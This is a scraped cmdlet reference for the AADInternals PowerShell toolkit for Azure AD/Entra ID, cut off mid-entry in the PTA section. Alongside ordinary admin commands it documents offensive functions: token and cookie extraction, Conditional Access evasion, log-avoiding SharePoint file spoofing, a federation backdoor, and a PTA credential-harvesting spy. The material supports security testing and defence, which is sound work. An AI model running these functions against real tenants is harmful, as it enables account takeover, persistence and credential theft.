# AADInternals Complete Cmdlet Reference

Source: https://aadinternals.com/aadinternals/
Scraped: 2026-03-26

---

## Token Letter Codes (Required Access Tokens)

| Code | Token Required | Function to Obtain |
|------|---------------|-------------------|
| `*` | No authentication required | N/A |
| `A` | AAD Graph | `Get-AADIntAccessTokenForAADGraph` |
| `M` | MS Graph | `Get-AADIntAccessTokenForMSGraph` |
| `Z` | Azure Admin Portal | `Get-AADIntAccessTokenForAADIAMAPI` |
| `E` | Exchange Online | `Get-AADIntAccessTokenForEXO` |
| `CA` | Compliance API | `Get-AADIntAccessTokenForCompliance` |
| `AC` | Azure Core Management | `Get-AADIntAccessTokenForAzureCoreManagemnt` |
| `P` | PTA | `Get-AADIntAccessTokenForPTA` |
| `J` | AAD Join | `Get-AADIntAccessTokenForAADJoin` |
| `S` | SharePoint Online | `Get-AADIntAccessTokenForSPO` |
| `O` | OneDrive | `Get-AADIntAccessTokenForOneDrive` |
| `C` | Cloud Shell | `Get-AADIntAccessTokenForCloudShell` |
| `T` | Teams/Skype | `Get-AADIntSkypeToken` |
| `AD` | Admin Portal | `Get-AADIntAccessTokenForAdmin` |
| `AP` | Access Packages | (MS Graph subset) |
| `CM` | Commerce | (Commerce API) |
| `MP` | MS Partner | (Partner API) |
| `MY` | MySignIns | (MySignIns API) |
| `ON` | OneNote | (OneNote API) |

Functions marked with the skull emoji (listed as "Endpoints module") require local system/endpoint access and typically administrative privileges.

---

## Common Parameters for All Get-AADIntAccessTokenFor\<Service\> Functions

| Parameter | Type | Description |
|-----------|------|-------------|
| `-Credentials` | PSCredential | User credentials for ROPC flow |
| `-Domain` | String | Domain name to authenticate against |
| `-Tenant` | String | Tenant ID for multi-tenant scenarios |
| `-SAML` | Switch | Authenticate using SAML token |
| `-KerberosTicket` | Byte[] | Kerberos ticket for authentication |
| `-DeviceCode` / `-UseDeviceCode` | Switch | Use device code authentication flow |
| `-ForceMFA` | Switch | Force multi-factor authentication |
| `-SaveToCache` | Switch | Persist tokens to local cache |
| `-IncludeRefreshToken` | Boolean | Return both access and refresh tokens |
| `-ESTSAUTH` | String | ESTSAUTH cookie for auth (v0.9.6+) |

### Token Cache Management

```powershell
# View cached tokens
Get-AADIntCache

# Clear all cached tokens
Clear-AADIntCache

# Manually add token to cache
Add-AADIntAccessTokenToCache -AccessToken "eyJ0eXA..." -RefreshToken "0.AXkA..."
```

### FOCI (Family of Client IDs)

Microsoft first-party apps share "Family Refresh Tokens." For FOCI clients, any refresh token from one FOCI member can obtain access tokens for other FOCI members. This enables cross-application token flexibility (e.g., Teams refresh token -> Graph access token).

---

## 1. Configuration

### Read-AADIntConfiguration
Loads settings from the module's config.json file, restoring previously saved configurations.

```powershell
Read-AADIntConfiguration
```

### Save-AADIntConfiguration
Persists current AADInternals settings to config.json for automatic loading on future module imports.

```powershell
Save-AADIntConfiguration
```

### Get-AADIntConfiguration
Displays all active AADInternals settings as a name-value table.

```powershell
Get-AADIntConfiguration
```

### Set-AADIntSetting
Sets individual configuration values by name.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Setting` | String | Yes | Setting name to configure |
| `-Value` | String | Yes | Value to assign |

```powershell
Set-AADIntSetting -Setting "User-Agent" -Value "Mozilla/5.0..."
```

### Set-AADIntUserAgent
Applies pre-configured user agent strings for specific device types to help evade Conditional Access policies.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Device` | String | Yes | Device type: Windows, MacOS, Linux, iOS, Android |

```powershell
Set-AADIntUserAgent -Device Windows
```

---

## 2. Access Token Functions

### Get-AADIntAccessTokenFor\<Service\>

Convenience wrappers that call `Get-AADIntAccessToken` with pre-configured ClientId and Resource values:

| Function | Service | Resource |
|----------|---------|----------|
| `Get-AADIntAccessTokenForAADGraph` | AAD Graph API | `https://graph.windows.net` |
| `Get-AADIntAccessTokenForMSGraph` | MS Graph API | `https://graph.microsoft.com` |
| `Get-AADIntAccessTokenForPTA` | Pass-Through Auth | PTA-specific |
| `Get-AADIntAccessTokenForAADIAMAPI` | Azure Admin Portal | IAM API |
| `Get-AADIntAccessTokenForEXO` | Exchange Online | Exchange-specific |
| `Get-AADIntAccessTokenForSARA` | Support & Recovery | SARA-specific |
| `Get-AADIntAccessTokenForSPO` | SharePoint Online | SPO-specific |
| `Get-AADIntAccessTokenForCompliance` | Microsoft Compliance | Compliance API |
| `Get-AADIntAccessTokenForAzureCoreManagemnt` | Azure Core Mgmt | `https://management.core.windows.net` |
| `Get-AADIntAccessTokenForAADJoin` | Azure AD Join | AAD Join-specific |
| `Get-AADIntAccessTokenForIntuneMDM` | Intune MDM | Intune-specific |
| `Get-AADIntAccessTokenForCloudShell` | Azure Cloud Shell | Cloud Shell-specific |

All accept the common parameters listed above.

### Get-AADIntAccessToken
Internal utility (exposed v0.6.9) that retrieves OAuth access tokens for specified client and resource combinations.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-ClientId` | String | Yes | Application ID requesting the token |
| `-Resource` | String | Yes | Target API endpoint/audience |
| `-Credential` | PSCredential | No | User credentials for ROPC flow |
| `-SaveToCache` | Switch | No | Store token for reuse |
| `-IncludeRefreshToken` | Switch | No | Return refresh token alongside access token |

```powershell
# Interactive
$at = Get-AADIntAccessToken -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" `
  -Resource "https://graph.microsoft.com"

# With caching
$at = Get-AADIntAccessToken -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" `
  -Resource "https://graph.microsoft.com" -SaveToCache
```

### Get-AADIntAccessTokenWithRefreshToken
Obtains new access tokens using existing refresh tokens, supporting FOCI clients.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-ClientId` | String | Yes | Target application ID |
| `-Resource` | String | Yes | Target API endpoint |
| `-TenantId` | String | Yes | Tenant identifier |
| `-RefreshToken` | String | Yes | Refresh token for renewal |

```powershell
$tokens = Get-AADIntAccessToken -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" `
  -Resource "https://graph.microsoft.com" -IncludeRefreshToken $true

$at = Get-AADIntAccessTokenWithRefreshToken -ClientId "1fec8e78-bce4-4aaf-ab1b-5451cc387264" `
  -Resource "https://graph.windows.net" -TenantId "contoso.azurelabs.online" `
  -RefreshToken $tokens[1]
```

### Export-AADIntAzureCliTokens (Endpoints module, v0.7.2)
Extracts cached Azure CLI access tokens from the DPAPI-protected msal_token_cache.bin file.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-AddToCache` | Switch | No | Import tokens into AADInternals cache |
| `-CopyToClipboard` | Switch | No | Copy tokens to clipboard |

```powershell
Export-AADIntAzureCliTokens -AddToCache -CopyToClipboard
```

### Export-AADIntTeamsTokens (Endpoints module, v0.7.2)
Retrieves Teams tokens from SQLite cookie database.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-CookieDatabase` | String | No | Path to Teams cookie database |
| `-AddToCache` | Switch | No | Import into AADInternals cache |

```powershell
Export-AADIntTeamsTokens
Export-AADIntTeamsTokens -CookieDatabase "C:\Cookies" -AddToCache
```

### Export-AADIntTokenBrokerTokens (Endpoints module, v0.7.5)
Exports access tokens from the Windows Token Broker cache.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-AddToCache` | Switch | No | Import tokens into AADInternals cache |

```powershell
Export-AADIntTokenBrokerTokens -AddToCache
```

### Get-AADIntAccessTokenUsingIMDS (v0.8.0)
Retrieves tokens via Azure Instance Metadata Service for managed identities on VMs.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Resource` | String | Yes | Target API endpoint |

```powershell
Get-AADIntAccessTokenUsingIMDS -Resource https://management.core.windows.net | `
  Add-AADIntAccessTokenToCache
```

### Get-AADIntESTSAUTHCookie (v0.9.7)
Returns ESTSAUTH authentication cookie, optionally persistent variant.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Persistent` | Switch | No | Request ESTSAUTHPERSISTENT cookie |
| `-ForceMFA` | Switch | No | Require MFA authentication |

```powershell
$ESTSAUTH = Get-AADIntESTSAUTHCookie
$ESTSAUTH = Get-AADIntESTSAUTHCookie -Persistent -ForceMFA
```

---

## 3. Tenant Information

### Get-AADIntLoginInformation (*)
Retrieves login information for a domain, including federation protocol, authentication URLs, and account type.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Domain` | String | Yes | Domain to query |

```powershell
Get-AADIntLoginInformation -Domain company.com
```

### Get-AADIntEndpointInstances (*)
Returns available Office 365 instances and version numbers.

```powershell
Get-AADIntEndpointInstances
```

### Get-AADIntEndpointIps (*)
Retrieves Office 365 IP addresses and URLs for a specified instance.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Instance` | String | Yes | Office 365 instance (e.g., WorldWide) |

```powershell
Get-AADIntEndpointIps -Instance WorldWide
```

### Get-AADIntTenantDetails (A)
Retrieves comprehensive tenant configuration details.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntTenantDetails
```

### Get-AADIntTenantID (*)
Obtains the tenant identifier for a given domain, user, or access token.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Domain` | String | No | Domain name to query |
| `-User` | String | No | User principal name |
| `-AccessToken` | String | No | Existing access token |

```powershell
Get-AADIntTenantID -Domain microsoft.com
```

### Get-AADIntOpenIDConfiguration (*)
Fetches OpenID Connect configuration metadata.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Domain` | String | No | Domain to query |

```powershell
Get-AADIntOpenIDConfiguration -Domain microsoft.com
```

### Get-AADIntServiceLocations (A)
Shows the tenant's service instance locations across regions.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntServiceLocations | Format-Table
```

### Get-AADIntServicePlans (A)
Returns tenant service plans including name, ID, status, and assignment timestamps.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntServicePlans | Format-Table
```

### Get-AADIntServicePrincipals (A)
Extracts all Azure AD service principals registered in the tenant.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-ClientIds` | String[] | No | Specific service principal app IDs to retrieve |

```powershell
Get-AADIntServicePrincipals
Get-AADIntServicePrincipals -ClientIds d32c68ad-72d2-4acb-a0c7-46bb2cf93873
```

### Get-AADIntSubscriptions (A)
Retrieves tenant subscription details including SKUs, license counts, trial status.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntSubscriptions
```

### Get-AADIntSPOServiceInformation (A)
Provides SharePoint Online instance details.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntSPOServiceInformation
```

### Get-AADIntCompanyInformation (A)
Returns tenant company information (equivalent to Get-MsolCompanyInformation).

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntCompanyInformation
```

### Get-AADIntCompanyTags (A)
Retrieves tags attached to the tenant.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Domain` | String | Yes | Domain to retrieve tags for |

```powershell
Get-AADIntCompanyTags -Domain "company.com"
```

### Get-AADIntAADConnectStatus (Z)
Shows Azure AD Connect synchronization status.

```powershell
Get-AADIntAccessTokenForAADIAMAPI -SaveToCache
Get-AADIntAADConnectStatus
```

### Get-AADIntSyncConfiguration (A)
Retrieves directory synchronization configuration details.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntSyncConfiguration
```

### Get-AADIntTenantDomain (M)
Retrieves the default domain for a specified tenant ID.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-TenantId` | String | Yes | Tenant identifier to query |

```powershell
Get-AADIntTenantDomain -TenantId 72f988bf-86f1-41af-91ab-2d7cd011db47
```

### Get-AADIntTenantDomains (*)
Returns all registered domains within a tenant.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Domain` | String | Yes | Any domain registered to the target tenant |

```powershell
Get-AADIntTenantDomains -Domain company.com
```

### New-AADIntMOERADomain (Z)
Adds a new Microsoft Online Email Routing Address domain (.onmicrosoft.com) to the tenant (up to 30 additional).

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Domain` | String | Yes | New MOERA domain to add |

```powershell
New-AADIntMOERADomain -Domain "mydomain.onmicrosoft.com"
```

### Get-AADIntKerberosDomainSyncConfig (A)
Retrieves tenant's Kerberos domain synchronization configuration.

```powershell
$at = Get-AADIntAccessTokenForAADGraph
Get-AADIntKerberosDomainSyncConfig -AccessToken $at
```

### Get-AADIntWindowsCredentialsSyncConfig (A)
Obtains Windows credentials synchronization configuration and encryption certificates.

```powershell
$at = Get-AADIntAccessTokenForAADGraph
Get-AADIntWindowsCredentialsSyncConfig -AccessToken $at
```

### Get-AADIntSyncDeviceConfiguration (A)
Returns synchronization device configuration settings.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntSyncDeviceConfiguration
```

### Get-AADIntTenantAuthPolicy (M)
Retrieves the tenant's authentication policies.

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Get-AADIntTenantAuthPolicy
```

### Get-AADIntTenantGuestAccess (M)
Returns current guest access settings for the tenant.

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Get-AADIntTenantGuestAccess
```

### Set-AADIntTenantGuestAccess (M)
Modifies tenant guest access configuration.

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Set-AADIntTenantGuestAccess
```

### Enable-AADIntTenantMsolAccess (M)
Enables MSOL PowerShell access for the tenant.

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Enable-AADIntTenantMsolAccess
```

### Disable-AADIntTenantMsolAccess (M)
Disables MSOL PowerShell access for the tenant.

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Disable-AADIntTenantMsolAccess
```

### Get-AADIntUnifiedAuditLogSettings (E)
Retrieves unified audit log settings.

```powershell
Get-AADIntAccessTokenForEXO -SaveToCache
Get-AADIntUnifiedAuditLogSettings
```

### Set-AADIntUnifiedAuditLogSettings (E)
Configures unified audit log settings.

```powershell
Get-AADIntAccessTokenForEXO -SaveToCache
Set-AADIntUnifiedAuditLogSettings
```

### Search-AADIntUnifiedAuditLog (CA)
Searches unified audit logs. Changed to use access token in v0.9.7.

```powershell
Get-AADIntAccessTokenForCompliance -SaveToCache
Search-AADIntUnifiedAuditLog
```

### Get-AADIntConditionalAccessPolicies (A)
Lists all conditional access policies configured in the tenant.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntConditionalAccessPolicies
```

### Get-AADIntAzureADPolicies (A)
Retrieves Azure AD policies (v0.8.0+).

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntAzureADPolicies
```

### Set-AADIntAzureADPolicyDetails (A)
Modifies Azure AD policy settings. Supports DisplayName (v0.8.1+).

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Set-AADIntAzureADPolicyDetails
```

### Get-AADIntSelfServicePurchaseProducts (CM)
Lists available self-service purchase products.

```powershell
Get-AADIntSelfServicePurchaseProducts
```

### Set-AADIntSelfServicePurchaseProduct (CM)
Enables or disables self-service product purchases.

```powershell
Set-AADIntSelfServicePurchaseProduct
```

### Unprotect-AADIntEstsAuthPersistentCookie (Endpoints, v0.6.8)
Decrypts ESTSAUTHPERSISTENT cookies protected with DPAPI.

```powershell
Unprotect-AADIntEstsAuthPersistentCookie
```

### Remove-AADIntUserFromEstsAuthPersistentCookie (Endpoints)
Removes a specific user from ESTSAUTHPERSISTENT cookie data.

```powershell
Remove-AADIntUserFromEstsAuthPersistentCookie
```

### Get-AADIntSyncFeatures (A)
Lists synchronization features and their status.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntSyncFeatures
```

### Set-AADIntSyncFeatures (A)
Modifies enabled synchronization features.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Set-AADIntSyncFeatures
```

### Get-AADIntTenantOrganisationInformation (AD, v0.6.7)
Provides tenant information including tenant name using tenant ID.

```powershell
Get-AADIntTenantOrganisationInformation
```

### Get-AADIntAzureADFeatures (A, v0.9.3)
Lists all Azure AD features available.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntAzureADFeatures
```

### Get-AADIntAzureADFeature (A, v0.9.3)
Retrieves details for a specific Azure AD feature.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntAzureADFeature
```

### Set-AADIntAzureADFeature (A, v0.9.3)
Modifies specific Azure AD feature settings.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Set-AADIntAzureADFeature
```

### Get-AADIntDynamicAbusableGroups (A, v0.9.6)
Identifies groups with dynamic membership rules that have user-modifiable attributes.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntDynamicAbusableGroups
```

### Get-AADIntAppConsentInfo (v0.9.6)
Shows information about application consent and permissions.

```powershell
Get-AADIntAppConsentInfo
```

---

## 4. Rollout Policy Functions

### Get-AADIntRolloutPolicies (M)
Retrieves rollout policies configured in the tenant.

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Get-AADIntRolloutPolicies
```

### Set-AADIntRolloutPolicy (M)
Modifies an existing rollout policy configuration.

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Set-AADIntRolloutPolicy
```

### Remove-AADIntRolloutPolicy (M)
Deletes a specified rollout policy.

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Remove-AADIntRolloutPolicy
```

### Get-AADIntRolloutPolicyGroups (M)
Lists security groups assigned to a rollout policy.

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Get-AADIntRolloutPolicyGroups
```

### Add-AADIntRolloutPolicyGroups (M)
Adds security groups to an existing rollout policy.

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Add-AADIntRolloutPolicyGroups
```

### Remove-AADIntRolloutPolicyGroups (M)
Removes security groups from a rollout policy.

```powershell
Get-AADIntAccessTokenForMSGraph -SaveToCache
Remove-AADIntRolloutPolicyGroups
```

---

## 5. Utilities

### Read-AADIntAccesstoken (*)
Decodes and displays the contents of an OAuth access token, revealing claims (user identity, tenant, permissions).

```powershell
Read-AADIntAccesstoken -AccessToken "eyJ0eXA..."
```

### Get-AADIntImmutableID (*)
Converts between user identifiers and immutable IDs used in directory synchronization.

```powershell
Get-AADIntImmutableID
```

### Start-AADIntCloudShell (C)
Initiates an Azure Cloud Shell session.

```powershell
Get-AADIntAccessTokenForCloudShell -SaveToCache
Start-AADIntCloudShell
```

### Set-AADIntProxySettings (Endpoints)
Configures HTTP proxy settings for traffic interception.

```powershell
Set-AADIntProxySettings
```

### Convert-AADIntObjectIDtoSID
Transforms an Entra ID object identifier into Windows SID format.

```powershell
Convert-AADIntObjectIDtoSID -ObjectId "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
```

### Convert-AADIntSIDtoObjectID
Transforms a Windows SID into Entra ID object identifier.

```powershell
Convert-AADIntSIDtoObjectID -SecurityIdentifier "S-1-12-1-..."
```

---

## 6. User Manipulation

### Get-AADIntUsers (A)
Retrieves a list of users from the tenant.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntUsers
```

### Get-AADIntUser (A)
Fetches detailed information for a specific user account.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntUser -UserPrincipalName "user@company.com"
```

### New-AADIntUser (A)
Creates a new user account in the tenant.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
New-AADIntUser -DisplayName "Test User" -UserPrincipalName "test@company.com"
```

### Set-AADIntUser (A)
Modifies properties of an existing user account.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Set-AADIntUser -UserPrincipalName "user@company.com" -Title "Manager"
```

### Remove-AADIntUser (A)
Permanently deletes a user account from the tenant.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Remove-AADIntUser -UserPrincipalName "user@company.com"
```

### Get-AADIntGlobalAdmins (A)
Lists all users with Global Administrator role assignments.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntGlobalAdmins
```

---

## 7. User MFA Manipulation

### Get-AADIntUserMFA (A)
Retrieves MFA status and methods configured for a user.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntUserMFA -UserPrincipalName "user@company.com"
```

### Set-AADIntUserMFA (A)
Modifies MFA settings for a user.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Set-AADIntUserMFA -UserPrincipalName "user@company.com"
```

### Get-AADIntUserMFAApps (A)
Lists authenticator applications registered to a user's account.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Get-AADIntUserMFAApps -UserPrincipalName "user@company.com"
```

### Set-AADIntUserMFAApps (A)
Manages authenticator applications assigned to a user.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Set-AADIntUserMFAApps -UserPrincipalName "user@company.com"
```

### Register-AADIntMFAApp (MY)
Enrolls a new application or device as an MFA method.

```powershell
Register-AADIntMFAApp
```

### New-AADIntOTPSecret
Generates a new One-Time Password secret key for TOTP.

```powershell
New-AADIntOTPSecret
```

### New-AADIntOTP
Creates a valid OTP code using an existing secret key.

```powershell
New-AADIntOTP -SecretKey "base32secret"
```

### Set-AADIntDeviceWHfBKey
Assigns Windows Hello for Business authentication key as MFA credential.

```powershell
Set-AADIntDeviceWHfBKey
```

---

## 8. User Manipulation with AD Sync API

### Get-AADIntSyncObjects (A)
Retrieves synchronized objects from Azure AD using the AD sync API.

```powershell
$at = Get-AADIntAccessTokenForAADGraph
Get-AADIntSyncObjects -AccessToken $at
```

### Set-AADIntAzureADObject (A)
Modifies synchronized Azure AD objects via the sync API.

```powershell
$at = Get-AADIntAccessTokenForAADGraph
Set-AADIntAzureADObject -AccessToken $at
```

### Remove-AADIntAzureADObject (A)
Removes Azure AD objects using the sync API.

```powershell
$at = Get-AADIntAccessTokenForAADGraph
Remove-AADIntAzureADObject -AccessToken $at
```

### Set-AADIntAzureADGroupMember (A, v0.8.1)
Modifies members of synchronized groups.

```powershell
$at = Get-AADIntAccessTokenForAADGraph
Set-AADIntAzureADGroupMember -AccessToken $at
```

### Set-AADIntUserPassword (A)
Modifies user passwords using sync API with optional legacy NTHash synchronization.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-AccessToken` | String | No | AAD Graph access token |
| `-IncludeLegacy` | Switch | No | Synchronizes legacy NTHash to Azure AD |

```powershell
$at = Get-AADIntAccessTokenForAADGraph
Set-AADIntUserPassword -AccessToken $at
```

### Reset-AADIntServiceAccount (A)
Resets service account credentials via sync API.

```powershell
$at = Get-AADIntAccessTokenForAADGraph
Reset-AADIntServiceAccount -AccessToken $at
```

---

## 9. Exchange Online Functions

### Get-AADIntEASAutoDiscover (*)
Retrieves Exchange ActiveSync autodiscovery information.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Email` | String | Yes | Email address to query |

```powershell
Get-AADIntEASAutoDiscover -Email user@company.com
```

### Get-AADIntEASAutoDiscoverV1 (E)
Returns EAS autodiscovery details using Exchange Online access token.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Email` | String | Yes | Email address |

```powershell
$at = Get-AADIntAccessTokenForEXO -SaveToCache
Get-AADIntEASAutoDiscoverV1 -Email user@company.com
```

### Set-AADIntEASSettings (E)
Configures Exchange ActiveSync settings.

```powershell
$at = Get-AADIntAccessTokenForEXO -SaveToCache
Set-AADIntEASSettings
```

### Get-AADIntMobileDevices (E)
Lists mobile devices registered with Exchange Online.

```powershell
$at = Get-AADIntAccessTokenForEXO -SaveToCache
Get-AADIntMobileDevices
```

### Send-AADIntEASMessage (E)
Sends messages via Exchange ActiveSync.

```powershell
$at = Get-AADIntAccessTokenForEXO -SaveToCache
Send-AADIntEASMessage
```

### Send-AADIntOutlookMessage (E)
Sends messages using Outlook API.

```powershell
$at = Get-AADIntAccessTokenForEXO -SaveToCache
Send-AADIntOutlookMessage
```

### Open-AADIntOWA (O, v0.6.2)
Opens Outlook Web Access using provided access token.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-AccessToken` | String | Yes | Exchange Online token |

```powershell
$at = Get-AADIntAccessTokenForEXO -SaveToCache
Open-AADIntOWA -AccessToken $at
```

---

## 10. SharePoint Online Functions

### Get-AADIntSPOSiteUsers (S)
Retrieves users from SharePoint Online sites.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Url` | String | Yes | SharePoint site URL |

```powershell
$at = Get-AADIntAccessTokenForSPO -SaveToCache
Get-AADIntSPOSiteUsers -Url "https://company.sharepoint.com"
```

### Get-AADIntSPOUserProperties (S)
Fetches user property details from SharePoint Online.

```powershell
$at = Get-AADIntAccessTokenForSPO -SaveToCache
Get-AADIntSPOUserProperties
```

### Get-AADIntSPOSiteGroups (S)
Lists groups within SharePoint Online sites.

| Parameter | Type | Required | Description |
|-----------|------|----------|-------------|
| `-Url` | String | Yes | SharePoint site URL |

```powershell
$at = Get-AADIntAccessTokenForSPO -SaveToCache
Get-AADIntSPOSiteGroups -Url "https://company.sharepoint.com"
```

### Set-AADIntSPOSiteMembers (S, v0.7.2)
Modifies SharePoint Online site membership.

```powershell
$at = Get-AADIntAccessTokenForSPO -SaveToCache
Set-AADIntSPOSiteMembers
```

### Export-AADIntSPOSiteFile (S, v0.9.1)
Exports files from SharePoint, Teams, or OneDrive.

```powershell
$at = Get-AADIntAccessTokenForSPO -SaveToCache
Export-AADIntSPOSiteFile
```

### Add-AADIntSPOSiteFiles (S, v0.9.1)
Adds/spoofs SharePoint files using SPMT protocol, bypassing logging.

```powershell
$at = Get-AADIntAccessTokenForSPO -SaveToCache
Add-AADIntSPOSiteFiles
```

### Update-AADIntSPOSiteFile (S, v0.9.1)
Modifies SharePoint files (content, user, timestamps) via SPMT, avoiding logging.

```powershell
$at = Get-AADIntAccessTokenForSPO -SaveToCache
Update-AADIntSPOSiteFile
```

---

## 11. OneDrive for Business Functions

### New-AADIntOneDriveSettings
Configures OneDrive for Business authentication settings.

```powershell
$settings = New-AADIntOneDriveSettings
```

### Get-AADIntOneDriveFiles (O)
Retrieves files from OneDrive for Business.

```powershell
$settings = New-AADIntOneDriveSettings
Get-AADIntOneDriveFiles -OneDriveSettings $settings
```

### Send-AADIntOneDriveFile (O)
Sends/uploads files to OneDrive for Business.

```powershell
$settings = New-AADIntOneDriveSettings
Send-AADIntOneDriveFile -OneDriveSettings $settings
```

---

## 12. Teams Functions

### Get-AADIntSkypeToken (T)
Obtains authentication token for Teams/Skype services.

```powershell
Get-AADIntSkypeToken
```

### Set-AADIntTeamsAvailability (T)
Modifies user's Teams availability status.

```powershell
Set-AADIntTeamsAvailability
```

### Set-AADIntTeamsStatusMessage (T)
Sets custom status message displayed in Teams profile.

```powershell
Set-AADIntTeamsStatusMessage -Message "Out of office"
```

### Search-AADIntTeamsUser (T)
Searches for Teams users by name or identifier.

```powershell
Search-AADIntTeamsUser -SearchString "John"
```

### Send-AADIntTeamsMessage (T)
Transmits messages through Teams platform.

```powershell
Send-AADIntTeamsMessage
```

### Get-AADIntTeamsMessages (T)
Retrieves Teams message history and content.

```powershell
Get-AADIntTeamsMessages
```

### Set-AADIntTeamsMessageEmotion (T)
Adds emoji reactions to existing Teams messages.

```powershell
Set-AADIntTeamsMessageEmotion
```

### Remove-AADIntTeamsMessages (T)
Deletes Teams messages from history.

```powershell
Remove-AADIntTeamsMessages
```

### Find-AADIntTeamsExternalUser (T)
Locates external Teams users by identifier.

```powershell
Find-AADIntTeamsExternalUser
```

### Get-AADIntTeamsExternalUserInformation (T)
Retrieves details about external Teams collaborators.

```powershell
Get-AADIntTeamsExternalUserInformation
```

### Get-AADIntTeamsAvailability (T)
Queries current Teams availability status for a user.

```powershell
Get-AADIntTeamsAvailability
```

### Get-AADIntTranslation (T)
Translates text to specified language.

```powershell
Get-AADIntTranslation -Text "Hello" -Language "es"
```

### Get-AADIntMyTeams (T)
Displays teams where authenticated user holds membership.

```powershell
Get-AADIntMyTeams
```

---

## 13. Identity Federation Hack Functions

### Set-AADIntDomainAuthentication (A)
Configures domain authentication mechanism between on-premises and cloud.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Set-AADIntDomainAuthentication -DomainName "company.com"
```

### ConvertTo-AADIntBackdoor (A)
Establishes persistent access through federated domain manipulation. Creates alternate authentication path maintaining access even if primary credentials are compromised.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
ConvertTo-AADIntBackdoor -DomainName "company.com"
```

### Find-AADIntBackdoor (A)
Detects previously installed backdoors in federated domains.

```powershell
Get-AADIntAccessTokenForAADGraph -SaveToCache
Find-AADIntBackdoor
```

### Open-AADIntOffice365Portal (*)
Launches authenticated Office 365 portal session.

```powershell
Open-AADIntOffice365Portal
```

---

## 14. Pass-Through Authentication (PTA) Hack Functions

### Set-AADIntPassThroughAuthentication (P)
Enables pass-through authentication for tenant.

```powershell
Get-AADIntAccessTokenForPTA -SaveToCache
Set-AADIntPassThroughAuthentication
```

### Install-AADIntPTASpy (Endpoints)
Deploys credential harvesting agent on PTA infrastructure. Captures all authentication credentials passing through PTA agent.

```powershell
Install-AADIntPTASpy
```

### Get-AADIntPTASpyLog (Endpoints)
Retrieves harvested credentials from deployed spy agent. Returns captured username/password combinations.

```powershell
Get-AADIntPTASpyLog
```

### Remove-AADIntPTASpy (Endpoints)
Removes deployed PTA credential harvesting agent.

```powershell
Remove-AADIntPTASpy
```

### Register-AADIntPTAAgent (P)
Enrolls new pass-through authentication agent with tenant.

```powershell
